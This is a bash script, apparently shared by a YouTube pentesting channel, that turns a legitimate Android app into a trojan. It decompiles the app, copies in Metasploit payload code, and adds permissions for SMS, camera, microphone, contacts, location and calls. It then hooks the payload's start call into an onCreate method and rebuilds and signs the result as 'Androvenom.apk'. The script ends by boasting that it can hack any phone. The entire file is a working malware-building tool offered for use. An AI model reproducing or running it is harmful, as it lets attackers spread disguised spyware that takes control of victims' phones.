#!/bin/bash
abort()
{
    echo "An error occurred. Exiting..." >&2
    exit 1
}

trap 'abort' 0
set -e
echo -e "\033[32m"
echo  "##############################################################"
echo  "## Please subscribe To my youtube channel ##                ##"
echo  "## https://www.youtube.com/channel/UCd9ZDgfoabrObsNGqz4gQvw ##"
echo  "## By Chihab Os :) PentestersLab                            ##"
echo  "##############################################################"
pe='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COURSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
apktool="./apktool.jar "
vok='    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V'
echo "warning please don't try to change the folder name or script name "
echo "Hello and wellcome in Androvenom-injector "
echo -n "Please enter the original (apk) path >>> : "
read apk_clean
echo  "###############################################"
echo -n "Please enter the payload (apk)  path >>> : "
read apk_payload
echo  "###############################################"
echo "[*]  waite ....../"
echo "decompiling the original apk....../"
java -jar $apktool d -f $apk_clean -o originalapk
echo "decompiling the Payload  apk....../"
java -jar $apktool d -f $apk_payload -o payloadapk 
sudo mv payloadapk/smali/com/metasploit originalapk/smali/com/
echo  " [*] wait while injecting necessary permission..."
sed  -i "5i\ ${pe}" originalapk/AndroidManifest.xml
echo 'injecting..../'
grep -r ";->onCreate(Landroid/os/Bundle;)V" 'originalapk/smali/com/' | cut -d ":" -f 1 > hook1.txt 
cat hook1.txt
sleep 3
echo "##################################################################"
echo -n "Please choose one to hook it >>> :"
read invoke
sleep 3
echo "########################################################"
grep -n ";->onCreate(Landroid/os/Bundle;)V" $invoke | cut -d ";" -f 1
echo "########################################################"
echo -n 'Please choose a number to complete the process >>> :'
read num_h
sed -i "${num_h}i\ ${vok}" ${invoke}
echo 'hooked'
rm hook1.txt
echo 'cleaning'
rm -r payloadapk
echo 'done'
echo 'Rebuilding ..../'
java -jar $apktool b originalapk -o embedded.apk
echo '[*]  waite while Signing the apk ....../ '
sleep 3
rm -r originalapk
mv embedded.apk signapk
cd signapk
java -jar signapk.jar certificate.pem key.pk8 embedded.apk Androvenom.apk
echo ' You will find it here '
pwd
echo 'Androvenom.apk'
rm embedded.apk
trap : 0

echo >&2 'Done You can now Hack any Phone in the world Now .....'
